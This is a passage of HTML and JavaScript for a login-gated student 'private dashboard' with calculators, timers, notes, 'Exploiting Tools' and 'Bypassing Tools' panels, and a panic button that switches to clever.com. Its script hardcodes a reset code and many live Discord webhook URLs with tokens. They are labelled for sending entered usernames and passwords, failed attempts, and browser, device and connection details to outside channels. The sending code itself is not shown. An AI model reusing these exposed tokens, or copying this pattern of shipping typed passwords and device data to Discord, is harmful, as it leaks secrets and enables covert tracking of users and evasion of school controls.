            <div class="setting-item">
                <label for="privacyPolicy">View Privacy Policy</label>
                <button id="privacyPolicyBtn">View</button>
            </div>
            <div class="setting-item">
                <label for="termsOfService">View Terms of Service</label>
                <button id="termsOfServiceBtn">View</button>
            </div>
            <!-- Additional settings could go here -->
        </div>

        <div id="keybindsPanel" class="info-panel box">
            <h2>⌨️ Keybinds Configuration</h2>
            <p>Define custom keyboard shortcuts for dashboard actions.</p>
            <div class="keybind-config">
                <input type="text" id="keybindInput" placeholder="Press key combination..." readonly>
                <select id="keybindAction">
                    <option value="">Select Action...</option>
                    <option value="togglePanel:calendarBox">Toggle Calendar</option>
                    <option value="togglePanel:motivationBox">Toggle Motivation</option>
                    <option value="togglePanel:updatesBox">Toggle Updates</option>
                    <option value="togglePanel:notificationsBox">Toggle Notifications</option>
                    <option value="togglePanel:randomFactsBox">Toggle Random Facts</option>
                    <option value="togglePanel:dailyQuotesBox">Toggle Daily Quotes</option>
                    <option value="togglePanel:wifiPanel">Toggle WiFi Info</option>
                    <option value="togglePanel:ipadPanel">Toggle iPad Info</option>
                    <option value="togglePanel:handbookPanel">Toggle Handbook Info</option>
                    <option value="togglePanel:mapPanel">Toggle Map Info</option>
                    <option value="togglePanel:studentWebsitesPanel">Toggle Student Websites</option>
                    <option value="togglePanel:teacherWebsitesPanel">Toggle Teacher Websites</option>
                    <option value="togglePanel:phoneDirectoryPanel">Toggle Phone Directory</option>
                    <option value="togglePanel:cameraPanel">Toggle Camera Info</option>
                    <option value="togglePanel:schoolInfoPanel">Toggle School Info</option>
                    <option value="togglePanel:exploitPanel">Toggle Exploiting Tools</option>
                    <option value="togglePanel:bypassPanel">Toggle Bypassing Tools</option>
                    <option value="togglePanel:vpnPanel">Toggle VPN Websites</option>
                    <option value="togglePanel:gamingPanel">Toggle Gaming Websites</option>
                    <option value="togglePanel:musicPanel">Toggle Music Websites</option>
                    <option value="togglePanel:keyboardPanel">Toggle Keyboard Tricks</option>
                    <option value="togglePanel:canvasContainer">Toggle Notes</option>
                    <option value="togglePanel:settingsPanel">Toggle Settings</option>
                    <option value="togglePanel:timerToolPanel">Toggle Timer Tools</option>
                    <option value="togglePanel:activityLogPanel">Toggle Activity Log</option>
                    <option value="togglePanel:loginHistoryPanel">Toggle Login History</option>
                    <option value="togglePanel:calculatorPanel">Toggle Calculator</option>
                    <option value="togglePanel:unitConverterPanel">Toggle Unit Converter</option>
                    <option value="togglePanel:statsPanel">Toggle Stats</option>
                    <option value="togglePanel:mediaPlayerPanel">Toggle Media Player</option>
                    <option value="showCustomAlert:Reminder Button">Show Reminder Button Alert</option>
                    <option value="triggerAction:screenshotBtn">Take Screenshot</option>
                    <option value="triggerAction:exportNotesBtn">Export Notes</option>
                    <option value="triggerAction:panicBtn">Trigger Panic Button</option>
                </select>
                <button id="keybindAddBtn">Add Keybind</button>
            </div>
            <h3>Active Keybinds:</h3>
            <div id="activeKeybindsList" style="max-height: 250px; overflow-y: auto; background: #1c1c1c; padding: 10px; border-radius: 8px;">
                <p>No keybinds configured yet.</p>
            </div>
        </div>

        <div id="timerToolPanel" class="info-panel box">
            <h2>⏰ Time & Productivity Tools</h2>

            <div class="tool-section">
                <h3>Stopwatch</h3>
                <div id="stopwatchDisplay" class="stopwatch-display">00:00:00</div>
                <div class="tool-controls">
                    <button id="stopwatchStartBtn">Start</button>
                    <button id="stopwatchPauseBtn">Pause</button>
                    <button id="stopwatchResetBtn">Reset</button>
                </div>
            </div>

            <div class="tool-section">
                <h3>Countdown Timer</h3>
                <div id="timerDisplay" class="timer-display">00:00</div>
                <div class="timer-inputs">
                    <input type="number" id="timerMinutesInput" value="0" min="0" max="99"> min
                    <input type="number" id="timerSecondsInput" value="0" min="0" max="59"> sec
                </div>
                <div class="tool-controls">
                    <button id="timerStartBtn">Start</button>
                    <button id="timerPauseBtn">Pause</button>
                    <button id="timerResetBtn">Reset</button>
                </div>
            </div>

            <div class="tool-section">
                <h3>Set Reminder (Alert)</h3>
                <input type="text" id="reminderMessage" class="reminder-input" placeholder="What's your reminder for?">
                <input type="datetime-local" id="reminderTime" class="reminder-input">
                <div class="tool-controls">
                    <button id="setReminderBtn">Set Reminder</button>
                </div>
            </div>
        </div>

        <div id="activityLogPanel" class="info-panel box">
            <h2>📋 Activity Log</h2>
            <div id="activityLogList">
                <p>No activity logged yet.</p>
            </div>
        </div>

        <div id="loginHistoryPanel" class="info-panel box">
            <h2>📜 Login History</h2>
            <p id="lastSuccessfulLoginDashboard">Last Successful Login: Never</p>
            <div id="loginHistoryList">
                <div>No login attempts recorded yet.</div>
            </div>
        </div>

        <div id="calculatorPanel" class="info-panel box">
            <h2>🧮 Calculator</h2>
            <div class="calculator-grid">
                <div id="calculatorDisplay">0</div>
                <button class="clear">C</button>
                <button class="operator">+/-</button>
                <button class="operator">%</button>
                <button class="operator">/</button>
                <button>7</button>
                <button>8</button>
                <button>9</button>
                <button class="operator">*</button>
                <button>4</button>
                <button>5</button>
                <button>6</button>
                <button class="operator">-</button>
                <button>1</button>
                <button>2</button>
                <button>3</button>
                <button class="operator">+</button>
                <button style="grid-column: span 2;">0</button>
                <button>.</button>
                <button class="equals">=</button>
            </div>
        </div>

        <div id="unitConverterPanel" class="info-panel box">
            <h2>↔️ Unit Converter</h2>
            <div>
                <input type="number" id="convertFromValue" value="1">
                <select id="convertFromUnit"></select>
            </div>
            <p style="text-align: center; margin: 10px 0;">to</p>
            <div>
                <select id="convertToUnit"></select>
                <p id="conversionResult">0</p>
            </div>
            <button id="performConversionBtn">Convert</button>
        </div>

        <div id="statsPanel" class="info-panel box">
            <h2>📊 Dashboard Statistics</h2>
            <div class="stats-grid">
                <div class="stat-item"><strong>Buttons Clicked:</strong> <span id="statsButtonsClicked">0</span></div>
                <div class="stat-item"><strong>Toggles Flipped:</strong> <span id="statsTogglesFlipped">0</span></div>
                <div class="stat-item"><strong>Panels Opened:</strong> <span id="statsPanelsOpened">0</span></div>
                <div class="stat-item"><strong>Canvases Cleared:</strong> <span id="statsCanvasesCleared">0</span></div>
                <div class="stat-item"><strong>Screenshots Taken:</strong> <span id="statsScreenshotsTaken">0</span></div>
                <div class="stat-item"><strong>Reminders Set:</strong> <span id="statsRemindersSet">0</span></div>
                <div class="stat-item"><strong>Time Since Last Reset:</strong> <span id="statsTimeSinceReset">0</span></div>
                <div class="stat-item"><strong>Canvas Lines Drawn:</strong> <span id="statsCanvasLinesDrawn">0</span></div>
                <div class="stat-item"><strong>Logins Attempted:</strong> <span id="statsLoginsAttempted">0</span></div>
                <div class="stat-item"><strong>Login Resets:</strong> <span id="statsLoginResets">0</span></div>
            </div>
            <button id="resetStatsBtn" class="reset-stats-btn">Reset All Statistics</button>
        </div>

        <div id="mediaPlayerPanel" class="info-panel box">
            <h2>▶️ Media Player</h2>
            <div style="display: flex; align-items: center; margin-bottom: 15px;">
                <input type="text" id="youtubeLinkInput" placeholder="Enter YouTube Link (e.g., https://youtu.be/dQw4w9WgXcQ)">
                <button id="loadYoutubeVideoBtn">Load</button>
            </div>
            <div style="text-align: center; margin-top: 10px;">
                <p>Due to browser security policies, video will open in a new tab.</p>
                <a id="currentPlayingVideoLink" href="#" target="_blank" style="display: none;">Click here to play video</a>
            </div>
            <!-- Old iframe approach, for demonstration might be left but actual playback blocked by origin policy for arbitrary embeds -->
            <!-- <iframe id="youtubePlayer" width="560" height="315" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen style="display: none;"></iframe> -->
        </div>

    </div> <!-- End dashboardLayoutContainer -->
  </div> <!-- End dashboard -->

  <!-- Custom Alert for timer/reminders etc. -->
  <div id="customAlert" class="custom-alert">
      <span class="custom-alert-icon"></span>
      <span id="customAlertMessage"></span>
  </div>

  <script>
    // Constants and configurations
    const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';
    const LOGIN_ATTEMPTS_MAX = 3;
    const RESET_CODE = 'Reset.Counter.2579';

    // New Webhooks for detailed logging systems
    const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjQf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
    };

    // Original webhooks
    const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLWCDTLtbBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
    };

    let users = [];
    let currentLoggedInUser = null;
    let loginTime = null; // Store for current successful login
    let loginHistory = JSON.parse(localStorage.getItem('loginHistory') || '[]');
    let activityLog = JSON.parse(localStorage.getItem('activityLog') || '[]');
    let keybinds = JSON.parse(localStorage.getItem('keybinds') || '{}');
    let panelPositions = JSON.parse(localStorage.getItem('panelPositions') || '{}');
    let statistics = JSON.parse(localStorage.getItem('dashboardStats') || '{}');
    const panelNames = {
        'calendarBox': 'Calendar',
        'motivationBox': 'Motivation',
        'updatesBox': 'Updates',
        'notificationsBox': 'Notifications',
        'randomFactsBox': 'Random Facts',
        'dailyQuotesBox': 'Daily Quotes',
        'wifiPanel': 'WiFi Information',
        'ipadPanel': 'iPad Restrictions',
        'handbookPanel': 'Student Handbooks',
        'mapPanel': 'School Map',
        'studentWebsitesPanel': 'Student Websites',
        'teacherWebsitesPanel': 'Teacher Websites',
        'phoneDirectoryPanel': 'Phone Directory',
        'cameraPanel': 'Camera Information',
        'schoolInfoPanel': 'School Information',
        'exploitPanel': 'Exploiting Tools',
        'bypassPanel': 'Bypassing Tools',
        'vpnPanel': 'VPN Websites',
        'gamingPanel': 'Gaming Websites',
        'musicPanel': 'Music Websites',
        'keyboardPanel': 'Keyboard Tricks',
        'canvasContainer': 'Notes Canvas',
        'settingsPanel': 'Settings',
        'keybindsPanel': 'Keybinds',
        'timerToolPanel': 'Timer & Tools',
        'activityLogPanel': 'Activity Log',
        'loginHistoryPanel': 'Login History',
        'calculatorPanel': 'Calculator',
        'unitConverterPanel': 'Unit Converter',
        'statsPanel': 'Statistics',
        'mediaPlayerPanel': 'Media Player',
    };

    // Helper to get element by ID and track clicks
    function getEl(id) {
        const el = document.getElementById(id);
        if (el) {
            // We want to track button clicks separately from general element clicks
            // For now, this is a general event, refine later if needed.
            if (el.tagName === 'BUTTON') {
                el.addEventListener('click', (event) => {
                    dashboard.logActivity(`Button clicked: ${el.textContent.trim().split('\n')[0]}`, 'Button');
                    dashboard.updateStat('buttonsClicked');
                });
            } else if (el.tagName === 'INPUT' && el.type === 'checkbox') {
                 el.addEventListener('change', (event) => {
                    dashboard.logActivity(`Toggle changed: ${el.id} to ${event.target.checked}`, 'Toggle');
                    dashboard.updateStat('togglesFlipped');
                });
            }
        }
        return el;
    }

    // Custom alert system (no sound by request)
    function customAlert(message, icon = 'ℹ️') {
        const alertBox = getEl('customAlert');
        const alertMessage = getEl('customAlertMessage');
        const alertIcon = getEl('customAlert-icon');

        if (alertMessage) {
            alertMessage.textContent = message;
            alertIcon.textContent = icon; // Assuming an icon element exists
            alertBox.classList.add('show');
            setTimeout(() => {
                alertBox.classList.remove('show');
            }, 5000); // Alert disappears after 5 seconds
        }
    }


    const dashboard = {
        init: function() {
            this.loadInitialStats(); // Load stats early
            this.initSessionTimer();
            this.initClockAndDate(); // Uses 24-hour setting
            this.generateCalendar();
            this.initThemeSelection();
            this.initButtons();
            this.initCanvas();
            this.initInfoPanels();
            this.initMotivationFactsQuotes();
            this.initSearchBar();
            this.initKeybinds();
            this.initPanelInteractivity(); // Makes panels draggable/resizable
            this.loadPanelPositions(); // Load stored positions
            this.initSettingsPanel();
            this.initLoginHistoryPanel();
            this.initCalculator();
            this.initUnitConverter();
            this.initMediaPlayer();

            this.applyPanelVisibilityAndDrag(); // Apply drag/resize to existing
            this.toggleSectionsVisibility(); // Show default sections as per settings
            this.showWelcomeNotification();
            dashboard.logActivity('Dashboard loaded.', 'System'); // Log dashboard load
        },

        updateStat: function(statName, increment = 1) {
            statistics[statName] = (statistics[statName] || 0) + increment;
            localStorage.setItem('dashboardStats', JSON.stringify(statistics));
            this.updateStatsDisplay(); // Update display immediately
        },

        getStat: function(statName) {
            return statistics[statName] || 0;
        },

        resetAllStats: function() {
            if (confirm('Are you sure you want to reset ALL dashboard statistics? This cannot be undone.')) {
                statistics = { lastReset: new Date().toISOString() };
                localStorage.setItem('dashboardStats', JSON.stringify(statistics));
                this.logActivity('All dashboard statistics reset.', 'System');
                customAlert('All statistics have been reset.', '🗑️');
                this.updateStatsDisplay(); // Update display after reset
            }
        },

        loadInitialStats: function() {
            statistics = JSON.parse(localStorage.getItem('dashboardStats') || '{}');
            // Initialize basic stats if they don't exist
            if (!statistics.buttonsClicked) statistics.buttonsClicked = 0;
            if (!statistics.togglesFlipped) statistics.togglesFlipped = 0;
            if (!statistics.panelsOpened) statistics.panelsOpened = 0;
            if (!statistics.canvasesCleared) statistics.canvasesCleared = 0;
            if (!statistics.screenshotsTaken) statistics.screenshotsTaken = 0;
            if (!statistics.remindersSet) statistics.remindersSet = 0;
            if (!statistics.canvasLinesDrawn) statistics.canvasLinesDrawn = 0;
            if (!statistics.loginsAttempted) statistics.loginsAttempted = 0;
            if (!statistics.loginResets) statistics.loginResets = 0;
            if (!statistics.lastReset) statistics.lastReset = new Date().toISOString(); // Set initial reset time
        },

        updateStatsDisplay: function() {
            getEl('statsButtonsClicked').textContent = this.getStat('buttonsClicked');
            getEl('statsTogglesFlipped').textContent = this.getStat('togglesFlipped');
            getEl('statsPanelsOpened').textContent = this.getStat('panelsOpened');
            getEl('statsCanvasesCleared').textContent = this.getStat('canvasesCleared');
            getEl('statsScreenshotsTaken').textContent = this.getStat('screenshotsTaken');
            getEl('statsRemindersSet').textContent = this.getStat('remindersSet');
            getEl('statsCanvasLinesDrawn').textContent = this.getStat('canvasLinesDrawn');
            getEl('statsLoginsAttempted').textContent = this.getStat('loginsAttempted');
            getEl('statsLoginResets').textContent = this.getStat('loginResets');

            const lastResetDate = new Date(statistics.lastReset);
            const now = new Date();
            const diffMs = now - lastResetDate;
            const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
            const diffHours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const diffMinutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));

            getEl('statsTimeSinceReset').textContent = `${diffDays}d ${diffHours}h ${diffMinutes}m`;
        },

        logActivity: function(description, type = 'User Action') {
            const timestamp = new Date().toLocaleString();
            activityLog.unshift({ timestamp, type, description }); // Add to front
            localStorage.setItem('activityLog', JSON.stringify(activityLog));
            this.updateActivityLogDisplay();
            customAlert(description, '📝'); // Use generic icon for all activity logs
        },

        updateActivityLogDisplay: function() {
            const activityList = getEl('activityLogList');
            if (activityList) {
                if (activityLog.length === 0) {
                    activityList.innerHTML = '<p>No activity logged yet.</p>';
                    return;
                }
                activityList.innerHTML = activityLog.map(entry =>
                    `<p><strong>${entry.timestamp} [${entry.type}]</strong>: ${entry.description}</p>`
                ).join('');
            }
        },

        downloadActivityLogs: function() {
            let logText = `Private Dashboard Activity Log\nGenerated: ${new Date().toLocaleString()}\n\n`;
            if (activityLog.length === 0) {
                logText += "No activity recorded.";
            } else {
                activityLog.forEach(entry => {
                    logText += `${entry.timestamp} [${entry.type}]: ${entry.description}\n`;
                });
            }

            const blob = new Blob([logText], { type: 'text/plain;charset=utf-8' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'dashboard_activity_log.txt';
            link.click();
            URL.revokeObjectURL(link.href);
            this.logActivity('Downloaded activity logs.', 'System');
        },


        initSessionTimer: function() {
            let sessionSeconds = 0;
            function formatTime(seconds) {
                const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
                const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
                const secs = String(seconds % 60).padStart(2, '0');
                return `${hrs}:${mins}:${secs}`;
            }

            function updateSessionTime() {
                sessionSeconds++;
                getEl('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
            }

            updateSessionTime();
            setInterval(updateSessionTime, 1000);
            this.logActivity('Session timer started.', 'System');
        },

        is24HourFormat: localStorage.getItem('24HourFormat') === 'true',

        initClockAndDate: function() {
            const toggle24Hour = getEl('toggle24Hour');
            toggle24Hour.checked = this.is24HourFormat;

            toggle24Hour.addEventListener('change', () => {
                this.is24HourFormat = toggle24Hour.checked;
                localStorage.setItem('24HourFormat', this.is24HourFormat);
                this.updateClockDisplay(); // Update display immediately
                this.logActivity(`24-hour format toggled to: ${this.is24HourFormat}`, 'Setting');
                this.updateStat('togglesFlipped');
            });

            this.updateClockDisplay();
            setInterval(() => this.updateClockDisplay(), 1000);
            this.logActivity('Clock and date initialized.', 'System');
        },

        updateClockDisplay: function() {
            const now = new Date();
            const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: !this.is24HourFormat };
            const dateOptions = { month: 'short', day: 'numeric', year: 'numeric' };

            const timeStr = now.toLocaleTimeString(undefined, timeOptions);
            const dateStr = now.toLocaleDateString(undefined, dateOptions);

            const loginTimeEl = getEl('loginTime');
            const loginDateEl = getEl('loginDate');
            const dashboardRealTimeClockEl = getEl('realTimeClock');
            const dashboardRealDateEl = getEl('realDate');

            if (loginTimeEl) loginTimeEl.innerText = timeStr;
            if (loginDateEl) loginDateEl.innerText = dateStr;
            if (dashboardRealTimeClockEl) dashboardRealTimeClockEl.innerText = '🕒 ' + timeStr;
            if (dashboardRealDateEl) dashboardRealDateEl.innerText = '📅 ' + dateStr;
        },


        generateCalendar: function() {
            const calendar = getEl('calendar');
            calendar.innerHTML = '';
            const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
            days.forEach(day => {
                const div = document.createElement('div');
                div.innerText = day;
                calendar.appendChild(div);
            });

            const date = new Date();
            const year = date.getFullYear();
            const month = date.getMonth();
            const today = date.getDate();

            const firstDay = new Date(year, month, 1).getDay();
            const lastDate = new Date(year, month + 1, 0).getDate();

            for (let i = 0; i < firstDay; i++) {
                const empty = document.createElement('div');
                calendar.appendChild(empty);
            }

            for (let i = 1; i <= lastDate; i++) {
                const cell = document.createElement('div');
                cell.innerText = i;
                if (i === today) cell.classList.add('today');
                calendar.appendChild(cell);
            }
            this.logActivity('Calendar generated.', 'System');
        },

        initThemeSelection: function() {
            const themeSelector = getEl('themeSelector');
            const currentTheme = localStorage.getItem('dashboardTheme') || 'dark'; // Default to dark

            if (currentTheme) {
                document.body.className = `dashboard-body ${currentTheme}-theme`;
                themeSelector.value = currentTheme;
            } else {
                document.body.className = `dashboard-body dark-theme`; // Fallback if no theme stored
                themeSelector.value = 'dark';
            }

            themeSelector.addEventListener('change', (event) => {
                const selectedTheme = event.target.value;
                document.body.className = `dashboard-body ${selectedTheme}-theme`;
                localStorage.setItem('dashboardTheme', selectedTheme);
                this.logActivity(`Theme changed to: ${selectedTheme}`, 'Setting');
                this.updateStat('togglesFlipped'); // Treat theme change as a toggle
            });
            this.logActivity(`Theme selector initialized with '${currentTheme}'.`, 'System');
        },

        dashboardZoomLevel: 1,
        dashboardZoomStep: 0.1,
        minZoom: 0.5,
        maxZoom: 2,

        initButtons: function() {
            getEl('panicBtn').addEventListener('click', () => {
                window.open('https://clever.com', '_blank');
                this.logActivity('Panic button triggered.', 'Security');
            });

            getEl('restartBtn').addEventListener('click', () => {
                if(confirm('Are you sure you want to kill the page (restart)?')) {
                    document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
                    this.logActivity('Dashboard killed (restart).', 'System');
                }
            });

            getEl('fixIssuesBtn').addEventListener('click', () => {
                customAlert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!', '👍');
                this.logActivity('Fix issues button clicked.', 'System');
            });

            getEl('fullScreenBtn').addEventListener('click', () => {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(err => {
                        customAlert(`Error attempting to enable full-screen mode: ${err.message}`, '❌');
                    });
                    this.logActivity('Enabled full-screen mode.', 'UI');
                } else {
                    document.exitFullscreen();
                    this.logActivity('Exited full-screen mode.', 'UI');
                }
            });

            getEl('dashboardZoomInBtn').addEventListener('click', () => {
                if (this.dashboardZoomLevel < this.maxZoom) {
                    this.dashboardZoomLevel += this.dashboardZoomStep;
                    document.body.style.zoom = this.dashboardZoomLevel;
                    this.logActivity(`Zoomed in to ${this.dashboardZoomLevel * 100}%`, 'UI');
                } else {
                    customAlert('Maximum zoom reached!', '🔍');
                }
            });

            getEl('dashboardZoomOutBtn').addEventListener('click', () => {
                if (this.dashboardZoomLevel > this.minZoom) {
                    this.dashboardZoomLevel -= this.dashboardZoomStep;
                    document.body.style.zoom = this.dashboardZoomLevel;
                    this.logActivity(`Zoomed out to ${this.dashboardZoomLevel * 100}%`, 'UI');
                } else {
                    customAlert('Minimum zoom reached!', '🔍');
                }
            });

            getEl('screenshotBtn').addEventListener('click', () => {
                const elementToCapture = document.body;
                html2canvas(elementToCapture).then(canvasImg => {
                    const link = document.createElement('a');
                    link.download = `dashboard_screenshot_${new Date().getTime()}.png`;
                    link.href = canvasImg.toDataURL('image/png');
                    link.click();
                });
                this.logActivity('Took a screenshot.', 'File');
                this.updateStat('screenshotsTaken');
            });

            getEl('toggleSectionsBtn').addEventListener('click', () => {
                const mainGrid = getEl('dashboardLayoutContainer');
                if (mainGrid.style.display === 'none') {
                    mainGrid.style.display = 'block';
                    getEl('toggleSectionsBtn').innerText = '⬆️ Toggle Main Grid';
                    this.logActivity('Main dashboard grid toggled ON.', 'UI');
                } else {
                    mainGrid.style.display = 'none';
                    getEl('toggleSectionsBtn').innerText = '⬇️ Toggle Main Grid';
                    this.logActivity('Main dashboard grid toggled OFF.', 'UI');
                }
                this.updateStat('togglesFlipped');
            });

            getEl('logoutBtn').addEventListener('click', () => {
                if (confirm('Are you sure you want to log out?')) {
                    // Update login history with logout time for current session
                    const lastLoginIndex = loginHistory.findIndex(entry => entry.loginTime === loginTime);
                    if (lastLoginIndex !== -1) {
                        loginHistory[lastLoginIndex].logoutTime = new Date().toISOString();
                        localStorage.setItem('loginHistory', JSON.stringify(loginHistory));
                    }
                    this.logActivity('User logged out.', 'System');
                    window.location.reload(); // Simple reload to go back to login screen
                }
            });

            getEl('downloadActivityLogsBtn').addEventListener('click', () => {
                this.downloadActivityLogs();
            });
            getEl('activityLogBtn').addEventListener('click', () => {
                this.togglePanel('activityLogPanel');
            });
            getEl('dashboardLoginHistoryBtn').addEventListener('click', () => {
                this.togglePanel('loginHistoryPanel');
            });
            getEl('settingsBtn').addEventListener('click', () => {
                this.togglePanel('settingsPanel');
            });
            getEl('keybindsBtn').addEventListener('click', () => {
                this.togglePanel('keybindsPanel');
            });
            getEl('timerToolBtn').addEventListener('click', () => {
                this.togglePanel('timerToolPanel');
            });
            getEl('calculatorBtn').addEventListener('click', () => {
                this.togglePanel('calculatorPanel');
            });
            getEl('unitConverterBtn').addEventListener('click', () => {
                this.togglePanel('unitConverterPanel');
            });
            getEl('statsBtn').addEventListener('click', () => {
                this.togglePanel('statsPanel');
            });
            getEl('mediaPlayerBtn').addEventListener('click', () => {
                this.togglePanel('mediaPlayerPanel');
            });
            getEl('reminderBtn').addEventListener('click', () => {
                 customAlert('Reminders are part of the Timer & Tools panel. Opening now.', '🔔');
                 this.togglePanel('timerToolPanel'); // Open the panel where reminder setup exists
                 this.logActivity('Clicked Reminder Button (redirected to Timer Tools).', 'UI');
                 this.updateStat('remindersSet');
            });

            this.logActivity('Dashboard buttons initialized.', 'System');
        },

        initCanvas: function() {
            const notesBtn = getEl('notesBtn');
            const canvasContainer = getEl('canvasContainer');
            const clearCanvasBtn = getEl('clearCanvasBtn');
            const closeCanvasBtn = getEl('closeCanvasBtn');
            const canvasThicknessInput = getEl('canvasThickness');
            const canvasColorInput = getEl('canvasColor');
            const textToAddToCanvas = getEl('textToAddToCanvas');
            const addTextToCanvasBtn = getEl('addTextToCanvasBtn');
            const longTextNotes = getEl('longTextNotes');
            const saveLongTextBtn = getEl('saveLongTextBtn');

            notesBtn.addEventListener('click', () => {
                this.togglePanel('canvasContainer');
            });
            closeCanvasBtn.addEventListener('click', () => {
                this.togglePanel('canvasContainer');
            });

            const canvas = getEl('notesCanvas');
            const ctx = canvas.getContext('2d');

            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            let drawing = false;
            let currentPath = [];

            // Load saved long text notes
            longTextNotes.value = localStorage.getItem('longTextNotes') || '';
            saveLongTextBtn.addEventListener('click', () => {
                localStorage.setItem('longTextNotes', longTextNotes.value);
                customAlert('Long text notes saved!', '💾');
                this.logActivity('Long text notes saved.', 'Notes');
            });


            function getPos(evt) {
                const rect = canvas.getBoundingClientRect();
                return {
                    x: (evt.clientX || evt.touches[0].clientX) - rect.left,
                    y: (evt.clientY || evt.touches[0].clientY) - rect.top
                };
            }

            canvas.addEventListener('mousedown', (e) => {
                drawing = true;
                const pos = getPos(e);
                ctx.beginPath();
                ctx.moveTo(pos.x, pos.y);
                currentPath = [{x: pos.x, y: pos.y, color: canvasColorInput.value, thickness: canvasThicknessInput.value}];
                e.preventDefault();
            });

            canvas.addEventListener('touchstart', (e) => {
                drawing = true;
                const pos = getPos(e);
                ctx.beginPath();
                ctx.moveTo(pos.x, pos.y);
                currentPath = [{x: pos.x, y: pos.y, color: canvasColorInput.value, thickness: canvasThicknessInput.value}];
                e.preventDefault();
            });

            canvas.addEventListener('mousemove', (e) => {
                if (!drawing) return;
                const pos = getPos(e);
                ctx.lineTo(pos.x, pos.y);
                ctx.strokeStyle = canvasColorInput.value;
                ctx.lineWidth = canvasThicknessInput.value;
                ctx.lineCap = 'round';
                ctx.stroke();
                currentPath.push({x: pos.x, y: pos.y, color: canvasColorInput.value, thickness: canvasThicknessInput.value});
                this.updateStat('canvasLinesDrawn');
                e.preventDefault();
            });

            canvas.addEventListener('touchmove', (e) => {
                if (!drawing) return;
                const pos = getPos(e);
                ctx.lineTo(pos.x, pos.y);
                ctx.strokeStyle = canvasColorInput.value;
                ctx.lineWidth = canvasThicknessInput.value;
                ctx.lineCap = 'round';
                ctx.stroke();
                currentPath.push({x: pos.x, y: pos.y, color: canvasColorInput.value, thickness: canvasThicknessInput.value});
                this.updateStat('canvasLinesDrawn');
                e.preventDefault();
            });

            ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
                canvas.addEventListener(evtName, () => {
                    drawing = false;
                    this.logActivity('Drawn on notes canvas.', 'Notes');
                });
            });

            clearCanvasBtn.addEventListener('click', () => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#fff';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                this.logActivity('Notes canvas cleared.', 'Notes');
                this.updateStat('canvasesCleared');
                customAlert('Canvas cleared!', '🗑️');
            });

            addTextToCanvasBtn.addEventListener('click', () => {
                const text = textToAddToCanvas.value.trim();
                if (text) {
                    const posX = canvas.width / 2; // Center horizontally
                    const posY = canvas.height / 2; // Center vertically
                    ctx.font = `${canvasThicknessInput.value * 5 + 10}px Arial`; // Scale font with thickness
                    ctx.fillStyle = canvasColorInput.value;
                    ctx.textAlign = 'center';
                    ctx.fillText(text, posX, posY);
